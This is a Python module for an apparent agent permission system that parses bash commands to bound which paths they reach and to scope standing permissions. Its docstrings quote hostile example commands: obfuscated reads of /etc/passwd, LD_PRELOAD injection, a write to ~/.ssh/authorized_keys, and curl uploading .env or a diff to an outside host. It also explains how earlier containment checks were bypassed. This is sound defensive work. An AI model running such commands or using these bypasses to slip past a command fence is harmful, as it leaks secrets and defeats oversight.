r"""Reading a shell command's worst case off its grammar.

The half of the capability extraction that has to understand bash. Split from
``capability.py`` because the two change for entirely different reasons: this file moves
when the grammar grows a construct or a construct's worst case is read wrong, and that one
moves when a tool is added. Keeping them together would mean a tree-sitter node table and
a tool-name table living in one file and being edited by two different kinds of change.

**Why a real parser.** A command's worst case is a property of its *syntax* — which words
are program names, which are arguments, where a substitution nests — and regexes over that
syntax are wrong on exactly the cases that matter: a `;` inside a quoted string, a `$(…)`
inside a `"…"`, a redirect glued to a word. `tree-sitter-bash` is the maintained grammar,
and it recovers from errors instead of throwing, so a command it cannot parse comes back
as a tree with error nodes we can *see* and treat as unreadable — rather than as an
exception someone might catch and shrug off. `bashlex`, the pure-Python alternative, has
been unmaintained since ~2019 and breaks on ordinary bashisms.

**Every unread construct is recorded, never skipped.** A skipped node would silently
shrink the described worst case to less than the real one, which is the one failure a
deterministic stage cannot have — its consumer would then clear a command on the strength
of the part of it that parsed.

**A word is only literal if the shell would hand it over unchanged.** The grammar gives
back the text as *written*, and the program is handed the text as *expanded* — and between
the two sit brace expansion, globbing and backslash removal, none of which the tree
records. `cat .\./etc/passwd`, `cat \/etc/passwd`, `cat {..,}/etc/passwd` and
`cat .[.]/.[.]/etc/passwd` all read `/etc/passwd` under `/bin/sh` while naming, as written,
a path with no `..` and no leading slash for a containment check to catch. So a bare word
carrying any of those characters is not read as a literal at all: it is recorded as
unbounded, exactly like a `$VAR`, and for the same reason — the value arrives later.

**And a word is only an operand if the program reads it as one.** `sh -c 'cat /etc/passwd'`
is a single word to the shell and a whole command line to `sh`; `python3 -c "print(open('…')
.read())"` is a program; `awk 'BEGIN{while((getline l < "/etc/passwd")>0) print l}'` is a
script. Measuring any of them as one relative path places `<root>/cat /etc/passwd` inside
the worktree and calls the command contained, which is how the containment check was walked
straight past. Telling those apart from `git commit -m 'fix the parser'` by *program*
needs to know what the program does with the string — the question this file exists to
stop asking, because answering it is the program table that was removed. Telling them apart
by what the words **name** needs no table: a quoted argument with spaces in it is measured
word by word, so `sh -c 'cat /etc/passwd'` is refused for the `/etc/passwd` it carries and
the commit message, carrying no path at all, clears. An argument carrying the punctuation a
parser reads as syntax (:data:`_COMPOSITE`) — `python3 -c 'print(open(…))'` — is not a word
this walk can place at all, and is recorded as unbounded. What that leaves is a script
whose every word stays inside the worktree, which is what the fence is there to hold.

**Every word a command line carries is measured, not only the operands.** The program
itself (`~/evil.sh`, `/etc/../bin/ls`) and an environment assignment's value
(`GIT_DIR=../../other/.git`, `LD_PRELOAD=/abs/x.so`) are paths as plainly as anything
after `cat`, and a walk that recorded only operands and redirect destinations handed all
of them a clean containment check — while refusing the identical path one position to the
right. A *bare* program name is the one exception and not an oversight: `ls` resolves
through `PATH`, which this command line did not write.

**What that does *not* cover, stated so nobody reads more into it.** The walk bounds what a
command's own words name. A command that takes its paths from *bytes* at run time —
`xargs cat < list`, a script the model just wrote — names nothing this file can read, and no
grammar could. The fence is the answer for that class: a ``workspace`` command runs in the platform
VM against a copy of the project, with no network, so a route its words did not name reaches
only what the guest copy holds — and it cannot send what it read anywhere.
"""

from __future__ import annotations

import re
from collections.abc import Sequence
from dataclasses import dataclass, field

import tree_sitter_bash
from tree_sitter import Language, Node, Parser

from services.permissions.fence import Fence, escapes
from services.permissions.shell_flags import attached_value, is_flag

#: One parser, built once. `tree_sitter.Parser` is a thin handle over an immutable grammar
#: and parsing is synchronous and CPU-bound; rebuilding it per call would pay the grammar
#: load on every deferred command for nothing.
_LANGUAGE = Language(tree_sitter_bash.language())
_PARSER = Parser(_LANGUAGE)

# Node types that carry no meaning of their own — sequencing, grouping punctuation and
# comments. Walked through rather than ruled on. The operators are listed by their literal
# text because that is what the grammar names an anonymous node.
_STRUCTURE = frozenset({"program", "list", "pipeline", "redirected_statement"})
_IGNORED = frozenset({"&&", "||", "|", "|&", ";", ";;", "&", "\n", "comment"})

# Argument nodes whose text is fixed at parse time — the only kind whose value we know.
_LITERAL = frozenset({"word", "number", "raw_string"})

# What the shell still does to a *bare* word after the grammar has read it and that this
# walk cannot follow: brace expansion, a bracket class, backslash removal, and a backtick's
# substitution. Any of them makes the string the program receives a different string from
# the one written here, so a word carrying one is not a literal — see the module docstring
# for the four commands this set exists for.
_EXPANDED_UNQUOTED = frozenset("\\{}[]`")

# The two glob characters are *not* in that set, because what they expand to is bounded in
# a way a brace or a backslash is not: a pattern matches names inside the directory its
# fixed prefix names, and nothing else. `src/*.py` reaches `src/` and no further, which is
# a containment question this walk can already answer (:meth:`_Walk._glob`). The one way a
# pattern leaves its directory is by matching `..`, and `/bin/sh` lets a segment do that
# only when it starts with a literal dot (`.[.]`, `.?`, `.*`) — so that shape stays unread.
_GLOB = frozenset("*?")

# The same question inside double quotes, where quoting has already suppressed globbing and
# brace expansion. A backslash still escapes and a backtick still substitutes; a single
# quoted string interprets nothing at all and is therefore always the literal it reads as.
_EXPANDED_IN_QUOTES = frozenset("\\`")

# The punctuation a command line or an expression language is written in. A word carrying
# one of these is not placed against the workspace at all — see the module docstring for the
# `sh -c` class of command this exists for. Whitespace is deliberately *not* here: a quoted
# argument with spaces in it is read word by word instead (:meth:`_Walk._reach_words`), so
# that `git commit -m 'fixed the parser'` clears and `sh -c 'cat /etc/passwd'` is refused
# for the path it carries rather than for the space beside it. Nor are the glob characters:
# `find . -name '*.py'` hands `*.py` to `find` as a pattern to match names with, and it can
# no more leave the directory than a bare word can.
_COMPOSITE = frozenset(";|&<>()$`")

#: How many *operands* :func:`command_prefixes` keeps: the program and the leading words
#: that say which of its modes was invoked (`uv run pytest`, `git commit`). Three is where
#: a longer prefix stops naming the act and starts naming its target, which is the part a
#: grant must not be scoped to. Flags are kept beside them and counted against nothing —
#: an option says what the act *is*, not what it is done to.
_PREFIX_WORDS = 3

# Constructs whose value is decided at run time, by the shell or by another command.
# Each is named in the refusal because "which part of this could not be read" is the
# operator's first question when a benign-looking command escalates.
_DYNAMIC = {
    "simple_expansion": "a variable whose value is not known here",
    "expansion": "a parameter expansion whose value is not known here",
    "command_substitution": "a nested command whose output becomes an argument",
    "process_substitution": "a nested command substituted as a file",
    "arithmetic_expansion": "an arithmetic expansion",
}

#: What goes on the record for a word carrying syntax the program it is handed to may run.
#: It names the doubt rather than the program, because the program is exactly what this
#: file refuses to reason about: `python3 -c 'print(1)'` and `git commit -m 'fix (again)'`
#: are the same shape, and only one of them is a program.
_COMPOSITE_UNREAD = "an argument carrying shell syntax that a program could run as a command line"

#: And for a word the shell — this one, or the one it is handed to — would rewrite first.
_EXPANDS_UNREAD = "a word the shell would expand or unescape"

#: A pattern segment that could match the parent directory: `/bin/sh` lets `.?`, `.*` and
#: `.[.]` match `..`, and a pattern that can name `..` can name anything above it.
_PARENT_GLOB_UNREAD = "a pattern that could match the parent directory"

#: What separates one path-shaped fragment from the next inside a word of a quoted script:
#: anything a path is not written with. Quotes, commas, colons and brackets are what a
#: program's own syntax puts beside a path, and every one of them is a boundary here.
_PATH_FRAGMENT = re.compile(r"[^\w./~*?-]+")

#: The same doubt about the word that decides everything else. Separate wording because a
#: program is not an argument, and the operator reading the refusal wants to know which.
_COMPOSITE_PROGRAM_UNREAD = "a program name that is more than one word"


@dataclass(frozen=True)
class ShellCommand:
    """One command inside a shell action — the program, and the words it was given.

    Kept as a pair rather than flattened into one list of words for the case that made the
    difference: `git log | git cat-file --batch` is two programs with two argument sets,
    and a policy asking "was this git invoked in a reading form?" has to be able to ask it
    of each one. A flat word list answers a different, weaker question.

    ``arguments`` is every literal argument in order, flags included — flags are kept
    because a flag is what separates `find .` from `find . -delete`, and because a flag is
    where a path hides when someone would rather it were not seen.
    """

    program: str
    arguments: tuple[str, ...] = ()


#: Programs that run the command written after their own options.
WRAPPERS = frozenset(
    {
        "sudo",
        "doas",
        "env",
        "command",
        "exec",
        "nohup",
        "nice",
        "time",
        "builtin",
        "timeout",
        "setsid",
        "stdbuf",
    }
)

#: Options of a wrapper that consume the next word.
WRAPPER_VALUE_FLAGS: dict[str, frozenset[str]] = {
    "sudo": frozenset({"-u", "-g", "-h", "-p", "-C", "-D", "-R", "-T", "-U", "-r", "-t"}),
    "doas": frozenset({"-u", "-C"}),
    "env": frozenset({"-u", "--unset", "-C", "--chdir", "-S"}),
    "nice": frozenset({"-n"}),
    "timeout": frozenset({"-s", "-k"}),
}

_UNWRAP_DEPTH = 4


def operands(arguments: Sequence[str], value_flags: frozenset[str] | None = None) -> list[str]:
    """The non-flag words of ``arguments``: the value of each flag in ``value_flags`` is
    skipped, and every word after a bare ``--`` is an operand."""
    skipped = value_flags or frozenset()
    found: list[str] = []
    skip = False
    literal = False
    for word in arguments:
        if skip:
            skip = False
        elif literal:
            found.append(word)
        elif word == "--":
            literal = True
        elif word in skipped:
            skip = True
        elif not is_flag(word):
            found.append(word)
    return found


def unwrap(one: ShellCommand) -> ShellCommand:
    """The command a wrapper such as ``sudo`` or ``env`` runs, however deeply wrapped."""
    for _ in range(_UNWRAP_DEPTH):
        name = one.program.rsplit("/", 1)[-1]
        if name not in WRAPPERS:
            return one
        words = list(one.arguments)
        value_flags = WRAPPER_VALUE_FLAGS.get(name, frozenset())
        index = 0
        while index < len(words):
            word = words[index]
            if word in value_flags:
                index += 2
            elif is_flag(word) or (name == "env" and "=" in word):
                index += 1
            else:
                break
        if name == "timeout":
            index += 1
        rest = words[index:]
        if not rest:
            return one
        one = ShellCommand(program=rest[0], arguments=tuple(rest[1:]))
    return one


@dataclass(frozen=True)
class ShellReach:
    """What one command would touch, as the walk found it."""

    commands: tuple[ShellCommand, ...] = ()
    reads: tuple[str, ...] = ()
    writes: tuple[str, ...] = ()
    env_writes: tuple[str, ...] = ()
    network: bool = False
    escapes: tuple[str, ...] = ()
    unbounded: tuple[str, ...] = field(default_factory=tuple)


def shell_reach(command: str, *, root: Fence | None) -> ShellReach:
    """What one shell command would reach, read off its syntax.

    ``root`` is what every path argument is measured against: the run's workspace
    directory or the thread's home. None when the turn has neither, in which case nothing
    can be placed and every absolute or upward path reads as an escape.
    """
    walk = _Walk(root)
    tree = _PARSER.parse(command.encode())
    # Asked of the whole tree before the walk, because the grammar's recovery is *quiet*:
    # `ls |` comes back as a well-formed pipeline whose second command has a MISSING name,
    # so a walk that only looked for ERROR nodes on its way down would describe it as two
    # commands and call the description complete. `has_error` covers both, at the root,
    # once — and the walk still runs, so what *was* read is still on the record.
    if tree.root_node.has_error:
        walk.unbounded.append("a fragment the shell grammar could not parse")
    walk.visit(tree.root_node)
    return ShellReach(
        commands=tuple(walk.commands),
        reads=tuple(walk.reads),
        writes=tuple(walk.writes),
        env_writes=tuple(walk.env_writes),
        network=walk.network,
        escapes=tuple(dict.fromkeys(walk.escapes)),
        unbounded=tuple(dict.fromkeys(walk.unbounded)),
    )


def parse(command: str) -> Node:
    """The root of ``command``'s syntax tree, for a caller that reads constructs this
    module's walk does not describe."""
    return _PARSER.parse(command.encode()).root_node


def strip_comments(command: str) -> str:
    """``command`` with its shell comments removed.

    A comment changes nothing about what runs — it is text addressed to whoever *reads*
    the command, which is precisely why it must not ride along into a prompt: it is the
    one part of a command whose author is writing to the reviewer rather than to the
    shell. Dropped off the grammar's own `comment` nodes rather than by cutting at `#`,
    since a `#` inside a quoted argument or a URL fragment is not a comment.
    """
    encoded = command.encode()
    spans: list[tuple[int, int]] = []
    _collect_comments(_PARSER.parse(encoded).root_node, spans)
    for start, end in sorted(spans, reverse=True):
        encoded = encoded[:start] + encoded[end:]
    text = encoded.decode(errors="replace")
    return "\n".join(line.rstrip() for line in text.splitlines()).strip()


def _collect_comments(node: Node, into: list[tuple[int, int]]) -> None:
    if node.type == "comment":
        into.append((node.start_byte, node.end_byte))
        return
    for child in node.children:
        _collect_comments(child, into)


def command_prefixes(command: str) -> tuple[tuple[str, ...], ...] | None:
    """The leading words that name what each stage of ``command`` does, or None when the
    command cannot be read.

    Per stage: the program, the flags written in front of its operands, and the operands
    up to :data:`_PREFIX_WORDS` — `uv run pytest`, `git commit`, `curl -sS <url>`. It is
    what a standing permission can be scoped to without being scoped to one invocation:
    `uv run pytest tests/test_a.py` and `uv run pytest tests/test_b.py` are the same act
    on different targets, and an operator saying "stop asking about this" means the act.

    **Every stage, not just the first**, because a pipeline is not one act. `git diff |
    curl -T - https://…` reads as a diff at its head and uploads at its tail, so a scope
    taken off the first command would name the harmless half and let the other run
    unasked. The answer is one prefix per command the walk found, and a caller matching a
    command against standing scopes has to satisfy every one of them.

    None where nothing may be inferred: a command with an unbounded construct in it (the
    word that decides the act may be the one we could not read), one with no command this
    file can name, and one **naming a path outside the workspace**. That last is not the
    same kind of refusal as the other two and is worth saying why it is here: `uv run
    pytest` and `uv run pytest > ~/.ssh/authorized_keys` lead with the same words and are
    not the same act — the second leaves the worktree, which is the boundary the fence is
    built around. A scope is a standing yes to an act *on a different target*, and a target
    outside the workspace is a different act.

    Every word is a word the operator can read back: non-empty, and free of the whitespace
    and syntax a second reader would have to re-quote. That holds because the walk refuses
    a composite program and a composite argument outright, and because an empty argument
    ends the prefix here — a scope is displayed and revoked by these words, and a word that
    survives neither is not one.
    """
    reach = shell_reach(command, root=None)
    if reach.unbounded or reach.escapes or not reach.commands:
        return None
    return tuple(_leading_words(one) for one in reach.commands)


def _leading_words(command: ShellCommand) -> tuple[str, ...]:
    """One command's program, the flags in front of its operands, and those operands,
    capped at :data:`_PREFIX_WORDS` of them.

    **A flag is part of the act, not a terminator.** Ending the prefix at the first `-`
    read `curl -sS https://api.example/x` as the one-word scope `("curl",)` — and since a
    later command's scope is read by this same walk, every flag-led curl read as
    `("curl",)` too, so one yes to an API fetch stood equally for `curl -d @.env
    https://elsewhere`. The same collapse turned `env -i true` into a standing yes to `env
    -i rm -rf src`. Keeping the flag costs the cap nothing and narrows the scope instead
    of ending it: what the cap is there to withhold is the *target*, and a target is an
    operand.

    A consequence worth stating, because it is what makes equality safe: a scope shorter
    than the cap covers only a command of exactly that shape. `ls -la` reads as `("ls",
    "-la")`, and `ls -la src` reads as three words and matches it nowhere. Only a scope
    that *reached* the cap covers the same act on another target — which is the case the
    cap exists for.

    An empty argument ends the prefix as the cap does, and so does one carrying whitespace.
    `git commit ""` is `git commit` with a target that happens to be empty, and carrying the
    empty word into the scope would put a member in it that names nothing and that no
    display of the scope could show; `git commit -m 'fixed the parser'` is `git commit -m`
    with a message for a target, and a message is the part of the act a scope exists to
    leave out — so the scope ends before it, and stands for a commit with *any* message.
    """
    words = [command.program]
    operands = 1
    for argument in command.arguments:
        if not argument or operands >= _PREFIX_WORDS or any(c.isspace() for c in argument):
            break
        words.append(argument)
        if not is_flag(argument):
            operands += 1
    return tuple(words)


def _literal(node: Node) -> str | None:
    """The fixed text of an argument node, or None when it is decided at run time.

    "Decided at run time" covers two kinds of node and not one. The obvious kind is a
    substitution — `"$HOME/foo"` is not `"foo"`, and telling the two apart is exactly what
    a regex cannot do. The other is a word the *shell itself* rewrites before the program
    sees it: a brace, a glob, a bracket class or a backslash escape. Both arrive here as
    None, because in both cases the text on the command line is not the value.
    """
    if node.type in _LITERAL:
        text = node.text.decode(errors="replace") if node.text else ""
        if node.type == "raw_string":
            # Single quotes suppress every expansion there is, so the text between them is
            # the value however it is spelled.
            return text[1:-1]
        return None if _expands(text, _EXPANDED_UNQUOTED) else text
    if node.type == "string":
        if any(child.type in _DYNAMIC for child in node.children):
            return None
        text = node.text.decode(errors="replace") if node.text else ""
        return None if _expands(text, _EXPANDED_IN_QUOTES) else text.strip('"')
    if node.type == "concatenation":
        parts = [_literal(child) for child in node.children]
        if any(part is None for part in parts):
            return None
        return "".join(part for part in parts if part is not None)
    return None


def _expands(text: str, characters: frozenset[str]) -> bool:
    """Whether the shell would still do something to ``text`` before passing it on."""
    return any(character in text for character in characters)


def _composite(value: str) -> bool:
    """Whether ``value`` is more than the one word a containment check can measure."""
    return _expands(value, _COMPOSITE)


def _unreadable(node: Node) -> str:
    """Why this node's text is not a value, in the words the refusal is written in.

    The distinction is worth making because the two answers point at different fixes: a
    construct we have no rule for is a gap in this module, and a word the shell would
    rewrite is a command that has to be spelled plainly before anything can vouch for it.
    """
    text = node.text.decode(errors="replace") if node.text else ""
    if _expands(text, _EXPANDED_UNQUOTED):
        return _EXPANDS_UNREAD
    return f"an argument of a kind not read here ({node.type})"


class _Walk:
    """One pass over a parsed command, accumulating what it would reach.

    A class rather than a fold because the walk is genuinely stateful — every branch
    contributes to the same lists — and because the recursion has to be able to stop
    describing and start refusing at any depth.
    """

    def __init__(self, root: Fence | None) -> None:
        self._root: Fence | None = root
        self.commands: list[ShellCommand] = []
        self.reads: list[str] = []
        self.writes: list[str] = []
        self.env_writes: list[str] = []
        self.escapes: list[str] = []
        self.unbounded: list[str] = []
        self.network: bool = False

    def visit(self, node: Node) -> None:
        if node.is_error or node.type == "ERROR":
            self.unbounded.append("a fragment the shell grammar could not parse")
            return
        if node.type in _IGNORED:
            return
        if node.type in _STRUCTURE:
            for child in node.children:
                self.visit(child)
            return
        if node.type == "command":
            self._command(node)
            return
        if node.type == "file_redirect":
            self._redirect(node)
            return
        if node.type in _DYNAMIC:
            self.unbounded.append(_DYNAMIC[node.type])
            return
        # Everything the grammar can produce and this module has no rule for: a subshell,
        # a loop, a function definition, a conditional, a heredoc. Naming the node type is
        # deliberate — it is the one string that tells whoever reads the escalation which
        # rule is missing.
        self.unbounded.append(f"an unrecognised shell construct ({node.type})")

    def _command(self, node: Node) -> None:
        program: str | None = None
        arguments: list[str] = []
        for child in node.children:
            if child.type == "variable_assignment":
                self._assignment(child)
            elif child.type == "command_name":
                # The command name is the one word that decides everything else, so a name
                # this module cannot read is not a command with an unknown name — it is
                # not a command at all as far as anything downstream may assume.
                program = _literal(child.children[0]) if child.child_count else None
                if not program:
                    # Empty as well as absent: a MISSING name node reads as the empty
                    # string, and an empty program is not a program with a short name.
                    program = None
                    self.unbounded.append("a program name assembled at run time")
                elif _composite(program) or any(c.isspace() for c in program):
                    # Stricter than the refusal :meth:`_argument` makes, because more
                    # rides on it: `'my prog'` is not one word, so it is neither a path
                    # this walk can place (it read as a *relative* one, landing
                    # comfortably inside the worktree) nor a name a standing permission
                    # could be scoped to — and unlike an argument, a program is not
                    # something to read word by word, since which of its words runs is
                    # exactly what is not known.
                    program = None
                    self.unbounded.append(_COMPOSITE_PROGRAM_UNREAD)
                else:
                    # **The program is a path argument too, and the first one.** A walk
                    # that measured only operands handed `~/evil.sh`, `../outside/evil.sh`
                    # and `/etc/../bin/ls` a clean containment check while refusing the
                    # very same paths written after `cat` — and running a file is reading
                    # it, which is the half no fence bounds. A *bare* name is deliberately
                    # not measured: it resolves through `PATH`, which is not a path this
                    # command named (:func:`_names_a_path` is what tells the two apart).
                    self._reach(program)
            elif child.type == "file_redirect":
                self._redirect(child)
            else:
                word = self._argument(child)
                if word is not None:
                    arguments.append(word)
        if program is not None:
            self.commands.append(ShellCommand(program, tuple(arguments)))

    def _assignment(self, node: Node) -> None:
        """One `NAME=value` prefix: the name for the record, the value for containment.

        Recording only the name is what let `GIT_DIR=../../other/.git git log` and
        `LD_PRELOAD=/abs/x.so ls` read as fully contained commands — the escaping path
        sat in the half nobody measured, so it was missing from the facts a reviewer
        would have been shown too, not merely from the check. The value is measured
        exactly like an operand, because that is what it is: a word this command line
        hands to whatever it runs.
        """
        name = node.child_by_field_name("name")
        self.env_writes.append(
            name.text.decode(errors="replace") if name and name.text else "an environment variable"
        )
        value = node.child_by_field_name("value")
        if value is None:
            # `NAME=` with nothing after it — the grammar gives no value node, and there
            # is no path in an empty string.
            return
        if value.type in _DYNAMIC:
            self.unbounded.append(_DYNAMIC[value.type])
            return
        literal = _literal(value)
        if literal is None:
            self.unbounded.append(_unreadable(value))
            return
        if _composite(literal):
            self.unbounded.append(_COMPOSITE_UNREAD)
            return
        words = literal.split()
        if len(words) > 1:
            self._reach_words(words)
            return
        self._reach(literal)

    def _redirect(self, node: Node) -> None:
        # Every redirect is recorded as a write, the input ones included. `< file` only
        # reads, but calling a read a write can only escalate, and a rule with no
        # exceptions is a rule nobody has to check the exceptions of.
        #
        # Read off the grammar's own `destination` field rather than by scanning the
        # children for one that happens to be literal: the redirect operator and a leading
        # file descriptor are children too, and a walk that skipped whatever it could not
        # read would record `> $OUT` and `> {a,b}` as redirects to nowhere.
        target = node.child_by_field_name("destination")
        if target is None:
            self.unbounded.append(f"a redirect with no destination to read ({node.type})")
            return
        if target.type in _DYNAMIC:
            self.unbounded.append(_DYNAMIC[target.type])
            return
        value = _literal(target)
        if value is None:
            self.unbounded.append(_unreadable(target))
            return
        self._path(value, self.writes)

    def _argument(self, node: Node) -> str | None:
        """One argument's literal text, recorded against the worst case as it goes.

        A flag reaches exactly as far as the value glued to it — `--output=/etc/passwd`
        and `-o/etc/passwd` name that file as plainly as writing it on its own would, and
        a walk that dismissed every word starting with `-` could not see either. What the
        flag *means* is not this file's question; that the word it carries is a path is.

        A word that is not a single operand is not measured as one. Whether
        `'cat /etc/passwd'` is a command line or a commit message is a fact about the
        program receiving it, and reading it as a relative path places it comfortably
        inside the worktree — which is how every `sh -c` cleared. So a quoted argument
        with spaces in it is measured **word by word** (:meth:`_reach_words`): the path it
        carries is refused as the path it is, and a commit message carrying none clears.
        One carrying the syntax a program would *run* is not placed at all.
        """
        if node.type in _DYNAMIC:
            self.unbounded.append(_DYNAMIC[node.type])
            return None
        value = _literal(node)
        if value is None:
            self.unbounded.append(_unreadable(node))
            return None
        if _composite(value):
            self.unbounded.append(_COMPOSITE_UNREAD)
            return None
        words = value.split()
        if len(words) > 1:
            self._reach_words(words)
            return value
        if is_flag(value):
            attached = attached_value(value)
            if attached is not None:
                self._reach(attached)
        else:
            self._reach(value)
        return value

    def _reach(self, word: str) -> None:
        """What one word — a program, an operand, or a flag's value — would touch.

        A word shaped `NAME=value` is measured twice: whole, and again from after its
        first `=`. `env LD_PRELOAD=/tmp/x.so ls` puts the assignment in an *argument*
        rather than in the shell's own assignment prefix, and `LD_PRELOAD=/tmp/x.so` read
        as one path is a relative one that lands comfortably inside the worktree — so the
        escaping half is visible only to a reading that looks past the `=`. A URL is left
        whole: its query string is full of `=` and none of it is a path.
        """
        self._measure(word)
        if "://" in word:
            return
        name, separator, value = word.partition("=")
        if separator and name and value:
            self._measure(value)

    def _reach_words(self, words: list[str]) -> None:
        """A quoted argument's words, each measured as the program it is handed to might.

        `sh -c 'cat /etc/passwd'` and `git commit -m 'fixed the parser'` are the same
        shape to the grammar, and telling them apart by *program* is the table this file
        exists without. Telling them apart by what the words *name* needs no table: the
        first carries a path outside the worktree and the second carries none, so the
        first is refused for the path and the second clears. A word the inner shell would
        rewrite (`\\/etc/passwd`, `{..,}/x`) is refused as unread, exactly as it would be
        on the outer command line — the escape is the same escape one shell deeper.
        """
        for word in words:
            if _expands(word, _EXPANDED_UNQUOTED):
                self.unbounded.append(_EXPANDS_UNREAD)
                return
            if "://" in word:
                self.network = True
                continue
            # A program's own quoting and punctuation can glue a path to a word — `open F,
            # "/etc/passwd"` carries the path inside a pair of quotes, and measured whole
            # the word is a *relative* path that lands inside the worktree. So the word is
            # split on everything a path cannot contain and every fragment is placed.
            for fragment in _PATH_FRAGMENT.split(word):
                if fragment:
                    self._measure(fragment)

    def _measure(self, word: str) -> None:
        """One string, placed: an address off this machine, a pattern, a path, or none."""
        if "://" in word:
            self.network = True
        elif _expands(word, _GLOB):
            self._glob(word)
        elif _names_a_path(word):
            self._path(word, self.reads)

    def _glob(self, pattern: str) -> None:
        """A pattern, placed by the directory it matches inside.

        Expansion happens in the directory the fixed part of the pattern names — `src/*.py`
        matches under `src/`, `*` under the working directory — so that fixed part is what
        is measured for containment, and it is measured exactly as an operand naming that
        directory would be. What is refused rather than measured is a segment that could
        match `..`: `/bin/sh` matches `.?`, `.*` and `.[.]` against the parent directory,
        and a pattern that can climb one level can climb every level above it.
        """
        for segment in pattern.split("/"):
            if _expands(segment, _GLOB) and segment.startswith("."):
                self.unbounded.append(_PARENT_GLOB_UNREAD)
                return
        fixed = pattern[: min(pattern.index(c) for c in _GLOB if c in pattern)]
        directory = fixed[: fixed.rfind("/") + 1]
        if directory:
            self._path(directory, self.reads)

    def _path(self, raw: str, into: list[str]) -> None:
        into.append(raw)
        if escapes(self._root, raw):
            self.escapes.append(raw)


def _names_a_path(word: str) -> bool:
    """Whether a word could reach out of the directory the command runs in.

    Only a word that *names a directory* can leave the workspace: a bare word is at worst
    a file beside the ones already there. Recording every bare word as a read would bury
    the two that matter under a page of grep patterns.
    """
    return "/" in word or word.startswith("~") or word in {".", ".."}
